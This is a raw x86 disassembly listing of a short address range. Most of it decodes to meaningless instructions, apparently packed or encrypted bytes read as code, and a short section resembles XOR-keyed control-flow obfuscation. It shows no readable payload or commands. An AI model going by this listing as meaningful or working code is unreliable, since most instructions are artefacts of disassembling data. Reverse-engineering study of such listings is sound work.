  41a6ff:	rcl    BYTE PTR [ebx],cl
  41a701:	xor    dl,BYTE PTR [ebx+ecx*4+0xa0751f6]
  41a708:	(bad)  
  41a709:	enter  0xf5ee,0x76
  41a70d:	cdq    
  41a70e:	sti    
  41a70f:	(bad)  [esi+edx*2+0x4ef6211]
  41a716:	adc    cl,bh
  41a718:	mov    eax,0xde938020
  41a71d:	scas   al,BYTE PTR es:[edi]
  41a71e:	loopne 0x41a6da
  41a720:	popa   
  41a721:	mov    bl,BYTE PTR [esi+edi*2-0x7c579c3b]
  41a728:	add    eax,edx
  41a72a:	cmp    al,0x98
  41a72c:	(bad)  
  41a72d:	fwait
  41a72e:	test   cl,dh
  41a730:	cli    
  41a731:	mov    dh,0x47
  41a733:	in     eax,0xe5
  41a735:	jp     0x41a77b
  41a737:	xchg   ecx,eax
  41a738:	inc    edi
  41a739:	cwde   
  41a73a:	aad    0x6c
  41a73c:	adc    BYTE PTR [ecx],0x91
  41a73f:	add    esi,esp
  41a741:	test   DWORD PTR [edi+edx*4-0x65],ecx
  41a745:	dec    esi
  41a746:	pop    ds
  41a747:	fadd   QWORD PTR ds:0xdbabb870
  41a74d:	lock repz retf 
  41a750:	push   0x48
  41a752:	test   eax,0xbc39d3d6
  41a757:	pop    edi
  41a758:	jle    0x41a6ef
  41a75a:	out    dx,al
  41a75b:	xchg   ebp,eax
  41a75c:	jmp    0x69d398ac
  41a761:	clc    
  41a762:	mov    ds:0xe779f97e,al
  41a767:	ins    DWORD PTR es:[edi],dx
  41a768:	xlat   BYTE PTR ds:[ebx]
  41a769:	pop    ebx
  41a76a:	mov    ecx,0x88c6f185
  41a76f:	sbb    DWORD PTR [edi+0x70b2f22d],0x26
  41a776:	call   0x9a0c:0x830468a2
  41a77d:	jnp    0x41a7c6
  41a77f:	add    al,0x2
  41a781:	adc    bh,BYTE PTR [esi+0x32]
  41a784:	into   
  41a785:	push   0xffffff8e
  41a787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a788:	pop    eax
  41a789:	fist   WORD PTR [edi]
  41a78b:	mov    esi,0xaab60914
  41a790:	les    ebx,FWORD PTR [ebp+0x58aa04e1]
  41a796:	frstor [eax+0x6c]
  41a799:	lods   eax,DWORD PTR ds:[esi]
  41a79a:	sub    al,0x6e
  41a79c:	dec    ebx
  41a79d:	ins    DWORD PTR es:[edi],dx
  41a79e:	aaa    
  41a79f:	(bad)  
  41a7a0:	jp     0x41a7a7
  41a7a2:	sbb    BYTE PTR [edx],ah
  41a7a4:	mov    bl,0x44
  41a7a6:	in     al,dx
  41a7a7:	cli    
  41a7a8:	push   edx
  41a7a9:	fmulp  st(3),st
  41a7ab:	jo     0x41a7f6
  41a7ad:	repnz in al,dx
  41a7af:	or     BYTE PTR [bx+si-0x6f],0x6c
  41a7b4:	and    bl,dh
  41a7b6:	rcr    eax,0x90
  41a7b9:	xor    al,0xc2
  41a7bb:	xchg   ebx,eax
  41a7bc:	fnstsw WORD PTR [ebx]
  41a7be:	ret    
  41a7bf:	inc    ebx
  41a7c0:	out    0xe2,al
  41a7c2:	xchg   ebx,eax
  41a7c3:	add    esi,DWORD PTR [ebx+0x73]
  41a7c6:	sub    eax,DWORD PTR [esi]
  41a7c8:	in     al,dx
  41a7c9:	sub    DWORD PTR [ebx-0x11],ebp
  41a7cc:	mov    ch,0x34
  41a7ce:	ja     0x41a7e5
  41a7d0:	adc    ch,BYTE PTR [edx+0x5]
  41a7d3:	pop    eax
  41a7d4:	jo     0x41a7e5
  41a7d6:	mov    eax,0xd7a48fb0
  41a7db:	xor    BYTE PTR [ecx],dh
  41a7dd:	xchg   ebx,eax
  41a7de:	xchg   edx,eax
  41a7df:	fisubr WORD PTR [edx]
  41a7e1:	in     al,0xf5
  41a7e3:	pop    edi
  41a7e4:	dec    ecx
  41a7e5:	or     al,0xb4
  41a7e7:	mov    edi,0x79ee9cbe
  41a7ec:	jnp    0x41a832
  41a7ee:	and    DWORD PTR [ebp-0x1b],esp
  41a7f1:	pushf  
  41a7f2:	test   esi,esi
  41a7f4:	and    eax,DWORD PTR [eax+edx*8]
  41a7f7:	dec    ebp
  41a7f8:	mov    ebp,0xe8094eb3
  41a7fd:	ins    DWORD PTR es:[edi],dx
  41a7fe:	(bad)  
  41a7ff:	loopne 0x41a86d
  41a801:	mov    DWORD PTR [edi],ebx
  41a803:	mov    bh,BYTE PTR [eax+0x2c]
  41a806:	mov    bh,0x57
  41a808:	cwde   
  41a809:	mov    ds:0xb7e2988f,al
  41a80f:	xchg   ebx,eax
  41a810:	mov    eax,ds:0x84fb760d
  41a815:	push   ebx
  41a816:	jo     0x41a7cd
  41a818:	xlat   BYTE PTR ds:[ebx]
  41a819:	test   eax,0x3cb43a74
  41a81e:	fmul   QWORD PTR [ecx+0x12fc8e33]
  41a824:	out    0x65,al
  41a826:	inc    ebx
  41a827:	jecxz  0x41a860
  41a829:	xor    bl,BYTE PTR [ebx-0xd3ab731]
  41a82f:	xchg   esp,eax
  41a830:	je     0x41a85e
  41a832:	fsubp  st(5),st
  41a834:	inc    edi
  41a835:	inc    edx
  41a836:	cmp    eax,0x5506f7e4
  41a83b:	or     eax,0x4af10b87
  41a840:	push   esi
  41a841:	sti    
  41a842:	call   0x79991bbd
  41a847:	in     al,dx
  41a848:	lahf   
  41a849:	and    al,0x77
  41a84b:	(bad)  
  41a84c:	stc    
  41a84d:	shl    DWORD PTR [edx+0x719eb42b],cl
  41a853:	push   es
  41a854:	fiadd  WORD PTR [eax+0x58400552]
  41a85a:	sub    dl,BYTE PTR [edx-0xb]
  41a85d:	test   BYTE PTR [esi-0x2b6854ba],bh
  41a863:	pop    esp
  41a864:	add    DWORD PTR [ebx+0x5d4b9f4a],esi
  41a86a:	imul   edi,DWORD PTR [ecx],0x2a6a8025
  41a870:	pusha  
  41a871:	dec    esi
  41a872:	neg    dh
  41a874:	and    bh,BYTE PTR [edi+0x5666e975]
  41a87a:	sbb    edx,esi
  41a87c:	push   0xffffff8d
  41a87e:	fstp   QWORD PTR [edi]
  41a880:	push   esp
  41a881:	shl    DWORD PTR [edi+0x68],cl
  41a884:	into   
  41a885:	aas    
  41a886:	jns    0x41a814
  41a888:	fwait
  41a889:	push   esp
  41a88a:	pop    ss
  41a88b:	add    al,0xfe
  41a88d:	inc    ebx
  41a88e:	lea    ebp,[di]
  41a891:	add    al,0xde
  41a893:	aad    0xa8
  41a895:	mov    ah,0x73
  41a897:	mov    dl,0x67
  41a899:	sub    cl,BYTE PTR [ecx+0x2e]
  41a89c:	mov    bl,0x3d
  41a89e:	sbb    BYTE PTR [ebp+0x41e438f0],bl
  41a8a4:	xchg   ebx,eax
  41a8a5:	and    al,0x8a
  41a8a7:	loop   0x41a845
  41a8a9:	sub    DWORD PTR [ecx-0xceadf82],ecx
  41a8af:	mov    esi,0xc303b236
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	adc    esp,0xffffffb1
  41a917:	inc    ebp
  41a918:	jp     0x41a962
  41a91a:	aad    0x7f
  41a91c:	js     0x41a92e
  41a91e:	jle    0x41a998
  41a920:	js     0x41a93f
  41a922:	xchg   ebp,eax
  41a923:	mov    al,0xe2
  41a925:	(bad)  
  41a926:	jl     0x41a8d8
  41a928:	cmp    eax,0x7f5cd52
  41a92d:	add    ch,dh
  41a92f:	icebp  
  41a930:	lods   eax,DWORD PTR ds:[esi]
  41a931:	xor    dl,bh
  41a933:	sbb    DWORD PTR ss:[ebp+0x60],edi
  41a937:	hlt    
  41a938:	cmp    al,bh
  41a93a:	mov    edi,0xf0e96567
  41a93f:	inc    edx
  41a940:	inc    ebx
  41a941:	jl     0x41a94f
  41a943:	in     al,0x7d
  41a945:	ret    0x921
  41a948:	push   ebp
  41a949:	data16 ins BYTE PTR es:[edi],dx
  41a94b:	inc    esp
  41a94c:	je     0x41a943
  41a94e:	mov    ebx,esi
  41a950:	dec    edx
  41a951:	jecxz  0x41a94b
  41a953:	in     al,dx
  41a954:	lods   al,BYTE PTR ds:[esi]
  41a955:	cmc    
  41a956:	dec    edx
  41a957:	ss adc al,0x3f
  41a95a:	scas   eax,DWORD PTR es:[edi]
  41a95b:	or     eax,0x677bbcee
  41a960:	mov    BYTE PTR [ecx+0x7a],ch
  41a963:	pushf  
  41a964:	dec    esi
  41a965:	sub    dh,bh
  41a967:	ins    BYTE PTR es:[edi],dx
  41a968:	div    BYTE PTR [ebx-0x3b]
  41a96b:	inc    dx
  41a96d:	imul   ebp,DWORD PTR [edx+0x78e3bf90],0xffffff95
  41a974:	bound  edx,QWORD PTR [ebx]
  41a976:	aas    
  41a977:	push   edi
  41a978:	and    eax,0x415ac8c
  41a97d:	push   ebp
  41a97e:	and    al,0xda
  41a980:	icebp  
  41a981:	hlt    
  41a982:	push   es
  41a983:	call   DWORD PTR [esp+ebp*4-0x6d]
  41a987:	adc    esi,DWORD PTR ds:0xa57552c9
  41a98d:	xor    ebx,eax
  41a98f:	sbb    eax,0x18900017
  41a994:	jp     0x41a96b
  41a996:	fwait
  41a997:	fs or  eax,0x8593ba92
  41a99d:	cwde   
  41a99e:	or     ah,dh
  41a9a0:	inc    edx
  41a9a1:	jae    0x41a95c
  41a9a3:	lea    edx,[eax+0x677d18e7]
  41a9a9:	push   esp
  41a9aa:	out    dx,eax
  41a9ab:	pop    es
  41a9ac:	sbb    edi,DWORD PTR [edi+0x783959f2]
  41a9b2:	sub    BYTE PTR [ebp-0x4e],0x36
  41a9b6:	sbb    eax,0xae952cd5
  41a9bb:	jo     0x41a996
  41a9bd:	or     BYTE PTR [ecx+0x7c01d095],al
  41a9c3:	into   
  41a9c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9c5:	cli    
  41a9c6:	and    esp,DWORD PTR [edi+0x745ad64b]
  41a9cc:	ficomp DWORD PTR ds:0x80f0b01e
  41a9d2:	sub    edx,DWORD PTR [ebx+0x566e3368]
  41a9d8:	and    al,0xc7
  41a9da:	push   eax
  41a9db:	mov    ebp,0x23c5add2
  41a9e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9e1:	mov    ds:0xf6a99535,al
  41a9e6:	pop    edx
  41a9e7:	stos   BYTE PTR es:[edi],al
  41a9e8:	add    eax,0x67700ab
  41a9ed:	pop    es
  41a9ee:	and    ah,BYTE PTR [ebp-0x111a0900]
  41a9f4:	iret   
  41a9f5:	push   0xf1cf76b1
  41a9fa:	mov    esi,0xd87e627
  41a9ff:	and    al,0x45
  41aa01:	idiv   BYTE PTR [eax-0x2a8bad71]
  41aa07:	jo     0x41a9df
  41aa09:	pop    edx
  41aa0a:	daa    
  41aa0b:	or     BYTE PTR [ebp+eax*1-0x31],dh
  41aa0f:	mov    edx,0xa02dab37
  41aa14:	push   ebx
  41aa15:	sbb    esi,DWORD PTR [edx]
  41aa17:	js     0x41a9af
  41aa19:	in     eax,dx
  41aa1a:	jecxz  0x41aa5c
  41aa1c:	adc    dh,BYTE PTR [eax]
  41aa1e:	push   eax
  41aa1f:	dec    esi
  41aa20:	pop    esi
  41aa21:	xchg   DWORD PTR [esi+eiz*1-0x54],edi
  41aa25:	(bad)  
  41aa26:	lods   eax,DWORD PTR ds:[esi]
  41aa27:	std    
  41aa28:	mov    bl,0x24
  41aa2a:	in     al,dx
  41aa2b:	sahf   
  41aa2c:	xor    eax,0xd00332dc
  41aa31:	out    dx,eax
  41aa32:	xchg   edi,eax
  41aa33:	mov    edi,0x8dd5ca98
  41aa38:	stc    
  41aa39:	aad    0xfb
  41aa3b:	mov    edx,0xee8b0c88
  41aa40:	pop    esi
  41aa41:	ds mov ch,0x1b
  41aa44:	xor    ebx,edi
  41aa46:	in     al,0x8d
  41aa48:	loopne 0x41a9eb
  41aa4a:	ss jle 0x41aabe
  41aa4d:	or     BYTE PTR [edi-0x31],bh
  41aa50:	fisub  DWORD PTR [eax-0x53ca1c4a]
  41aa56:	jp     0x41aa55
  41aa58:	lods   al,BYTE PTR ds:[esi]
  41aa59:	xor    al,0x94
  41aa5b:	fs mov al,0x28
  41aa5e:	mov    eax,ds:0x193ffc00
  41aa63:	mov    dl,BYTE PTR [ecx]
  41aa65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa66:	dec    ebx
  41aa67:	popf   
  41aa68:	out    dx,al
  41aa69:	jle    0x41aa04
  41aa6b:	(bad)  
  41aa6c:	js     0x41a9f5
  41aa6e:	mov    dl,0x66
  41aa70:	popf   
  41aa71:	push   0x26121802
  41aa76:	inc    ebp
  41aa77:	cwde   
  41aa78:	clc    
  41aa79:	aam    0x34
  41aa7b:	mov    dl,cl
  41aa7d:	out    dx,eax
  41aa7e:	retf   0x397a
  41aa81:	and    esp,DWORD PTR [ecx]
  41aa83:	inc    ebp
  41aa84:	jmp    0x2bdcb16b
  41aa89:	mov    ecx,0xa2275d5f
  41aa8e:	data16 mov ah,0x8f
  41aa91:	ss add al,0xf2
  41aa94:	push   0xffffff96
  41aa96:	xor    DWORD PTR [edx],eax
  41aa98:	pop    ebp
  41aa99:	(bad)  [eax+edi*1-0x32]
  41aa9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa9e:	dec    eax
  41aa9f:	ss pop es
  41aaa1:	sub    ebp,edx
  41aaa3:	(bad)  
  41aaa5:	jns    0x41aa5a
  41aaa7:	xor    cl,BYTE PTR [edx-0x55]
  41aaaa:	dec    edx
  41aaab:	and    BYTE PTR [eax+0x20],ah
  41aaae:	add    BYTE PTR [ebx+0x3b],al
  41aab1:	push   ecx
  41aab2:	lock nop
  41aab4:	imul   esi,DWORD PTR [eax-0x56902e5c],0x4d9a48fb
  41aabe:	push   ebx
  41aabf:	xor    eax,0x678806b1
  41aac4:	mov    BYTE PTR [esi-0x6f],bl
  41aac7:	mov    ds,WORD PTR [esi]
  41aac9:	adc    DWORD PTR [edi+ebp*1-0x7bb5e745],esi
  41aad0:	xchg   edi,eax
  41aad1:	cmp    al,0x9f
  41aad3:	and    ah,BYTE PTR [esi+0x2b]
  41aad6:	bnd jle 0x41ab42
  41aad9:	retf   0x87a1
  41aadc:	shl    BYTE PTR [ebx],cl
  41aade:	aas    
  41aadf:	fwait
  41aae0:	cmp    al,BYTE PTR [ecx+0xe2d1c7]
  41aae6:	mov    edi,0xa7457626
  41aaeb:	mov    WORD PTR [ebp+0x24],?
  41aaee:	icebp  
  41aaef:	bound  esp,QWORD PTR [edx-0x1516d189]
  41aaf5:	cli    
  41aaf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaf7:	push   esi
  41aaf8:	bound  ebp,QWORD PTR [ebx-0x24]
  41aafb:	std    
  41aafc:	inc    edx
  41aafd:	inc    ebp
  41aafe:	jbe    0x41ab4e
  41ab00:	mov    eax,0x5adea1c
  41ab05:	add    eax,0xee152ec2
  41ab0a:	sbb    BYTE PTR ds:0xb13e18d1,0xe3
  41ab11:	adc    eax,0x89e0ca79
  41ab16:	dec    esi
  41ab17:	std    
  41ab18:	(bad)  
  41ab19:	xor    eax,0xad71f3c7
  41ab1e:	lahf   
  41ab1f:	fisttp QWORD PTR [esi-0x9]
  41ab22:	dec    edi
  41ab23:	xchg   BYTE PTR ds:0x13bb4a23,ch
  41ab29:	pop    ebx
  41ab2a:	ins    BYTE PTR es:[edi],dx
  41ab2b:	xchg   edi,eax
  41ab2c:	inc    esp
  41ab2d:	adc    eax,0x4f18faa1
  41ab32:	(bad)  
  41ab33:	(bad)  
  41ab34:	popa   
  41ab35:	push   edx
  41ab36:	enter  0x6e3f,0x59
  41ab3a:	push   0x5
  41ab3c:	dec    ecx
  41ab3d:	pop    ebx
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0xf04cdbbe
  41ab52:	mov    ds:0x787fdb60,al
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41ab33
  41ab5c:	mov    ebx,0x931b9acd
  41ab61:	pop    ss
  41ab62:	rol    BYTE PTR [eax+0x58dd68e7],0x68
  41ab69:	fild   WORD PTR [edx-0x60ce8ab4]
  41ab6f:	cmp    BYTE PTR [eax+edx*2+0x4fe1a136],bl
  41ab76:	mov    edx,0xc8ee2112
  41ab7b:	mov    dl,0xfd
  41ab7d:	mov    al,ds:0xf4fdd0a8
  41ab82:	sbb    al,0x25
  41ab84:	or     ah,ah
  41ab86:	hlt    
  41ab87:	pop    edx
  41ab88:	push   ebx
  41ab89:	imul   esi,DWORD PTR [eax-0x5dd16749],0xffffff92
  41ab90:	scas   al,BYTE PTR es:[edi]
  41ab91:	out    dx,al
  41ab92:	jnp    0x41ab51
  41ab94:	cmc    
  41ab95:	in     al,0xd7
  41ab97:	xchg   esp,eax
  41ab98:	pop    edx
  41ab99:	cwde   
  41ab9a:	rcr    DWORD PTR ds:0x7fa8ad2c,1
  41aba0:	test   DWORD PTR [ecx],edi
  41aba2:	cmp    esp,DWORD PTR [ebx-0x73c3f9ce]
  41aba8:	adc    eax,0x73d9c30f
  41abad:	fstp   st(4)
  41abaf:	test   eax,0x8ad9b04f
  41abb4:	in     eax,dx
  41abb5:	jp     0x41aba5
  41abb7:	jle    0x41ac21
  41abb9:	mov    al,0x33
  41abbb:	fs push edx
  41abbe:	pop    esi
  41abbf:	sti    
  41abc0:	adc    al,0x9a
  41abc2:	leave  
  41abc3:	xchg   esi,eax
  41abc4:	xor    bh,bl
  41abc6:	xchg   ecx,eax
  41abc7:	dec    ebp
  41abc8:	imul   ebx,DWORD PTR [ecx+ebx*2],0xfffffff0
  41abcc:	jecxz  0x41ab60
  41abce:	lock adc BYTE PTR [esp+ebp*4-0x7f],bl
  41abd3:	aaa    
  41abd4:	add    esp,DWORD PTR [eax]
  41abd6:	inc    esi
  41abd7:	sbb    ebp,0xcf26a40a
  41abdd:	xchg   edx,eax
  41abde:	and    eax,0x42fa5b3d
  41abe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abe4:	jg     0x41ac0a
  41abe6:	bound  edx,QWORD PTR [edx-0x7c]
  41abe9:	(bad)  
  41abea:	cld    
  41abeb:	fwait
  41abec:	leave  
  41abed:	and    al,0xf7
  41abef:	aas    
  41abf0:	inc    ebp
  41abf1:	push   esi
  41abf2:	loope  0x41abc3
  41abf4:	pop    ebp
  41abf5:	aad    0xc6
  41abf7:	jnp    0x41ac62
  41abf9:	fs pop ecx
  41abfb:	in     eax,dx
  41abfc:	push   cs
  41abfd:	enter  0xb030,0x2b
  41ac01:	push   eax
  41ac02:	push   ebp
  41ac03:	and    BYTE PTR [ebx+0x76cbfac2],ch
  41ac09:	mov    esp,esp
  41ac0b:	pop    edi
  41ac0c:	sbb    edx,esi
  41ac0e:	dec    ebp
  41ac0f:	lds    ecx,FWORD PTR [esi]
  41ac11:	push   es
  41ac12:	fisttp WORD PTR [edx-0x34ac96cd]
  41ac18:	scas   eax,DWORD PTR es:[edi]
  41ac19:	stos   BYTE PTR es:[edi],al
  41ac1a:	inc    esi
  41ac1b:	and    eax,0x38de107b
  41ac21:	pop    es
  41ac22:	pop    ebx
  41ac23:	aaa    
  41ac24:	retf   
  41ac25:	jo     0x41ac38
  41ac27:	jg     0x41ac23
  41ac29:	in     eax,0xd9
  41ac2b:	das    
  41ac2c:	inc    ebp
  41ac2d:	dec    esi
  41ac2e:	adc    al,BYTE PTR [ebx]
  41ac30:	pop    edx
  41ac31:	inc    edi
  41ac32:	jecxz  0x41ac98
  41ac34:	mov    DWORD PTR [ebx],ecx
  41ac36:	dec    ecx
  41ac37:	sbb    al,0x9e
  41ac39:	xchg   ebx,eax
  41ac3a:	fld    QWORD PTR [esi]
  41ac3c:	lock (bad) 
  41ac3e:	cmp    al,0xc3
  41ac40:	(bad)  
  41ac41:	gs iret 
  41ac43:	push   ss
  41ac44:	test   BYTE PTR [edx-0x68c056f7],bh
  41ac4a:	in     al,dx
  41ac4b:	dec    esi
  41ac4c:	dec    esp
  41ac4d:	lods   al,BYTE PTR fs:[esi]
  41ac4f:	daa    
  41ac50:	mov    edx,0xe60cb308
  41ac55:	fist   DWORD PTR [ebp+ecx*8+0x5dc63c3d]
  41ac5c:	(bad)  
  41ac5d:	pop    ebx
  41ac5e:	jecxz  0x41ac1f
  41ac60:	addr16 icebp 
  41ac62:	inc    esp
  41ac63:	or     al,0x99
  41ac65:	mov    esi,0x826e56a4
  41ac6a:	sub    BYTE PTR [ebx],dh
  41ac6c:	jb     0x41acbe
  41ac6e:	dec    edi
  41ac6f:	cli    
  41ac70:	cmp    eax,esp
  41ac72:	push   edi
  41ac73:	push   0xb1585404
  41ac78:	sbb    al,0x1c
  41ac7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac7b:	fcompp 
  41ac7d:	sub    dl,BYTE PTR [ebx+0x634819fb]
  41ac83:	dec    edi
  41ac84:	fld    TBYTE PTR [edx-0x453bf2cb]
  41ac8a:	cld    
  41ac8b:	pop    edx
  41ac8c:	stos   DWORD PTR es:[edi],eax
  41ac8d:	xchg   edi,eax
  41ac8e:	xchg   DWORD PTR [esi-0x213c273c],esp
  41ac94:	in     al,dx
  41ac95:	test   eax,0x47ce82a8
  41ac9a:	lea    esp,[ebx]
  41ac9c:	lds    edi,FWORD PTR [edi-0x2fcf1173]
  41aca2:	inc    edi
  41aca3:	lods   eax,DWORD PTR ds:[esi]
  41aca4:	jb     0x41ac54
  41aca6:	push   esp
  41aca7:	push   esp
  41aca8:	mov    ss,WORD PTR [ebp-0xa04e797]
  41acae:	or     ah,BYTE PTR [edi]
  41acb0:	jg     0x41acf7
  41acb2:	rcr    ebx,1
  41acb4:	les    ebp,FWORD PTR [eax+ecx*1]
  41acb7:	add    eax,0x782dfc33
  41acbc:	enter  0xa059,0xaf
  41acc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acc1:	lds    eax,FWORD PTR [eax-0x42]
  41acc4:	(bad)  
  41acc6:	in     al,0x5d
  41acc8:	(bad)  
  41acc9:	cmp    al,BYTE PTR [edx]
  41accb:	xchg   edx,eax
  41accc:	out    0xb9,eax
  41acce:	bnd ret 
  41acd0:	xchg   esi,eax
  41acd1:	dec    edx
  41acd2:	pop    esi
  41acd3:	into   
  41acd4:	or     bh,0x58
  41acd7:	pop    ecx
  41acd8:	push   ss
  41acd9:	push   ebp
  41acda:	gs sub bl,ah
  41acdd:	push   ecx
  41acde:	mov    esp,0xbee97d35
  41ace3:	cmp    BYTE PTR [ebx+eiz*4+0x2f847811],bl
  41acea:	rcl    DWORD PTR [ebp-0x46],cl
  41aced:	lods   eax,DWORD PTR ds:[esi]
  41acee:	pusha  
  41acef:	imul   DWORD PTR [ecx]
  41acf1:	rcr    BYTE PTR [ebp-0x4bf0dab7],0xf6
  41acf8:	(bad)  
  41acf9:	mov    eax,0xb742a837
  41acfe:	retf   
  41acff:	fnstenv [ecx-0x632ef55a]
  41ad05:	nop
  41ad06:	ins    BYTE PTR es:[edi],dx
  41ad07:	cmp    BYTE PTR [edx-0x25978890],cl
  41ad0d:	adc    ch,BYTE PTR [ebx]
  41ad0f:	xchg   edi,eax
  41ad10:	les    ecx,FWORD PTR [ecx-0x1cff724b]
  41ad16:	mov    ecx,0x1876d15c
  41ad1b:	mov    ecx,?
  41ad1d:	jmp    0x41ad70
  41ad1f:	sahf   
  41ad20:	aad    0x8c
  41ad22:	push   es
  41ad23:	(bad)  
  41ad24:	mov    edi,0xc36ae6fc
  41ad29:	xchg   DWORD PTR [ebx-0x5b8752c5],ebx
  41ad2f:	mov    ds:0xcb3430a4,eax
  41ad34:	or     al,0x3c
  41ad36:	or     BYTE PTR [esi+0x53],ch
  41ad39:	shr    DWORD PTR [ecx],1
  41ad3b:	xor    dh,BYTE PTR [eax]
  41ad3d:	dec    esp
  41ad3e:	ja     0x41ad08
  41ad40:	mov    al,ds:0x17a861c7
  41ad45:	jne    0x41ad4b
  41ad47:	sahf   
  41ad48:	stos   BYTE PTR es:[edi],al
  41ad49:	push   ecx
  41ad4a:	pop    edx
  41ad4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad4c:	pop    ebp
  41ad4d:	add    eax,0x4b31c87c
  41ad52:	lock test eax,0xa4315fd4
  41ad58:	js     0x41ad5d
  41ad5a:	pop    ds
  41ad5b:	iret   
  41ad5c:	xor    BYTE PTR [ebx+ebp*1-0x2af1b3ff],ch
  41ad63:	fucomi st,st(7)
  41ad65:	push   ebx
  41ad66:	enter  0x6dc6,0x80
  41ad6a:	mov    DWORD PTR [ebx],edx
  41ad6c:	adc    al,0x44
  41ad6e:	out    dx,eax
  41ad6f:	lds    ebx,FWORD PTR [esi]
  41ad71:	addr16 nop
  41ad73:	xchg   ebx,ecx
  41ad75:	sub    ebx,ecx
  41ad77:	jmp    0x41afac
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0xced25295,eax
  41ad89:	jb     0x41ad7e
  41ad8b:	mov    dl,0x78
  41ad8d:	fdivr  DWORD PTR [edi+0x78]
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41adb3
  41ad95:	mov    bh,0xea
  41ad97:	and    BYTE PTR [esi-0x248d1be6],al
  41ad9d:	xchg   esp,eax
  41ad9e:	retf   0x4175
  41ada1:	imul   eax,DWORD PTR [ebx+0x718a15af],0x25
  41ada8:	data16 mov BYTE PTR [edx-0x33],bh
  41adac:	push   es
  41adad:	jb     0x41adba
  41adaf:	jb     0x41ad6f
  41adb1:	dec    ebx
  41adb2:	pop    ecx
  41adb3:	fs xchg edi,eax
  41adb5:	jl     0x41ade3
  41adb7:	mov    ebx,0x92b6b059
  41adbc:	add    ebp,DWORD PTR [eax-0x22367bd5]
  41adc2:	push   0xffffffff
  41adc4:	pop    ecx
  41adc5:	or     dl,BYTE PTR ds:0x22a60329
  41adcb:	stc    
  41adcc:	jp     0x41ad59
  41adce:	adc    BYTE PTR [ecx+0x5be2dc9b],bl
  41add4:	lahf   
  41add5:	sub    edx,DWORD PTR [edi-0x19]
  41add8:	sub    DWORD PTR [eax-0x2de40fec],edx
  41adde:	sub    esi,DWORD PTR [eax+0x57]
  41ade1:	(bad)  
  41ade2:	daa    
  41ade3:	out    dx,al
  41ade4:	lds    esi,FWORD PTR [edx+0x76]
  41ade7:	mov    al,0xc6
  41ade9:	inc    eax
  41adea:	and    DWORD PTR [ebp-0x4f],eax
  41aded:	pop    edi
  41adee:	popf   
  41adef:	call   0xb306a8be
  41adf4:	outs   dx,DWORD PTR ds:[esi]
  41adf5:	scas   al,BYTE PTR es:[edi]
  41adf6:	push   0xfffffff1
  41adf8:	xstore-rng 
  41adfb:	ins    BYTE PTR es:[edi],dx
  41adfc:	push   0xa3f338e
  41ae01:	je     0x41ade3
  41ae03:	fs push ss
  41ae05:	test   DWORD PTR [esi+0x41],edi
  41ae08:	sub    edi,edi
  41ae0a:	mov    al,0x6e
  41ae0c:	jecxz  0x41ae1a
  41ae0e:	or     eax,DWORD PTR [eax]
  41ae10:	add    eax,0x60c10530
  41ae15:	pop    edx
  41ae16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae17:	popa   
  41ae18:	inc    ecx
  41ae19:	leave  
  41ae1a:	mov    edx,0xa40c39b1
  41ae1f:	ja     0x41adab
  41ae21:	dec    ebp
  41ae22:	clc    
  41ae23:	sbb    ebx,esi
  41ae25:	add    BYTE PTR [ecx-0x5cd187a5],cl
  41ae2b:	lock cmp DWORD PTR [edx+0x43d82c3a],eax
  41ae32:	ret    
  41ae33:	push   ecx
  41ae34:	out    0x1e,eax
  41ae36:	retf   
  41ae37:	sbb    eax,0x3c64e08e
  41ae3c:	adc    esp,edi
  41ae3e:	push   esi
  41ae3f:	push   eax
  41ae40:	rcr    DWORD PTR [ebp+0x7c],0x34
  41ae44:	loop   0x41ae0f
  41ae46:	or     al,0x81
  41ae48:	inc    esi
  41ae49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae4a:	les    eax,FWORD PTR [edi]
  41ae4c:	loop   0x41ae73
  41ae4e:	push   es
  41ae4f:	xchg   esi,eax
  41ae50:	pop    ebx
